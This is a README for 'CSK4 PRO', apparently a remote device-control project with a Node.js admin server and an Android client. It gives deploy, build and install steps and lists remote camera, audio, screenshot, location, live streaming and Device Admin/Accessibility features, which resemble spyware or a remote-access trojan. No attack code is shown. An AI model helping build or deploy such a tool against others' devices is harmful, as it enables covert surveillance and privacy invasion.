# CSK4 PRO - Admin Control System

Full remote device control system with Android app + Node.js admin server.

## Project Structure

```
csk4-project/
├── server/                 # Node.js + Socket.IO admin panel
│   ├── server.js
│   ├── package.json
│   ├── render.yaml         # Render.com deploy config
│   └── public/             # Admin web panel
├── android-app/            # Android client (Kotlin)
│   └── app/src/main/...
└── scripts/                # Build helpers
```

## Quick Start

### 1. Deploy Server (Render.com)

1. Push this repo to GitHub
2. Go to [render.com](https://render.com) → New → Web Service
3. Connect the repo
4. Settings:
   - **Root Directory**: `server`
   - **Build Command**: `npm install`
   - **Start Command**: `npm start`
   - **Environment**:
     - `PORT` = `4000`
     - `NODE_VERSION` = `18.20.0`
5. Deploy → Get your URL (e.g. `https://csk4-server.onrender.com`)

### 2. Configure Android App

Open `android-app/app/src/main/java/com/csk4/app/Config.kt` and set:

```kotlin
const val SERVER_URL = "https://YOUR-RENDER-URL.onrender.com"
```

### 3. Build APK

```bash
cd android-app
./gradlew clean assembleDebug
```

APK location: `android-app/app/build/outputs/apk/debug/app-debug.apk`

Or open the `android-app` folder in **Android Studio**.

### 4. Install & Run

```bash
adb install -r android-app/app/build/outputs/apk/debug/app-debug.apk
```

## Scripts

```bash
chmod +x scripts/*.sh
./scripts/build-debug.sh      # Build debug APK
./scripts/build-release.sh    # Build release APK
./scripts/install-apk.sh      # Install to connected device
./scripts/git-setup.sh        # Helper for first Git push
```

## Features

- Device registration & heartbeat
- Remote commands (camera, video, audio, screenshot, location, etc.)
- WebRTC live streaming
- Device Admin + Accessibility services
- Admin web panel with Socket.IO

## Notes

- First Gradle sync in Android Studio can take 5-10 minutes
- `local.properties` is auto-generated by Android Studio (do not commit)
- Icons (`mipmap-*`) are generated by Android Studio Image Asset tool
- Change `DEVICE_TOKEN` in `Config.kt` for security
